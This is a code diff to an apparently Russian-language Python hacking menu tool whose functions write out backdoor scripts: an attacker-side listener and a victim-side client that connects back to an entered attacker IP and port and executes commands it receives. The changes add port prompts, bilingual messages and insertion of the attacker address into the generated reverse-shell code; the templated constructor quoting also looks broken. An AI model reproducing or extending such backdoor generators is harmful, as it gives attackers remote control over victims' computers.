@@ -162,6 +162,7 @@ def DefSec4():
 		print("Прощайте!(Goodbye!)")
 		raise SystemExit
 	def Backdoor1():
+		clean()
 		banner1 = '''
 	______            _       _                         __  
 	| ___ \          | |     | |                       /  | 
@@ -189,7 +190,8 @@ def DefSec4():
 			DefSec4()
 		def BackdoorS():
 			os.chdir('USER-BD')
-			ip = input('Введите свой IP')
+			ip = input('Введите свой IP(Enter IP):')
+			pt = input('Введите порт(Enter Port):')
 			v = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			k = open(v,"w",encoding='utf-8')
 			k.write("""import socket, json
@@ -228,15 +230,17 @@ class Listener:
 			command = command.split(" ")
 			result = self.execute_remotely(command)
 			print(result)
-my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
+my_listener = Listener('"""+str(ip)+""", """+str(pt)+"""')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
 my_listener.go() """)	
 			k.close()
-			print('Готово')
-			
+			print('Готово!(Done!)')
+			print('Посмотрите в папке USER-BD')
+			print('Look in the USER-BD folder')
 				
 		def BackdoorC():
 			os.chdir('USER-BD')
-			ip = input('Введите свой IP')
+			ip = input('Введите свой IP(Enter IP):')
+			pt = input('Введите порт(Enter Port):')
 			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			n = open(f,"w",encoding='utf-8')
 			n.write("""#Жертва
@@ -269,11 +273,12 @@ class Backdoor:
 			command_result = self.execute_system_command(command)
 			self.reliable_send(command_result)
 	
-my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера обезательно!
+my_backdoor = Backdoor('"""+str(ip)+""", """+str(pt)+""") #ip хакера обезательно!
 my_backdoor.run() """)
 			n.close()
-			
-				
+			print('Готово!(Done!)')
+			print('Посмотрите в папке USER-BD')
+			print('Look in the USER-BD folder')	
 		if bdv1 ==1:
 			BackdoorS()
 		elif bdv1 ==2:
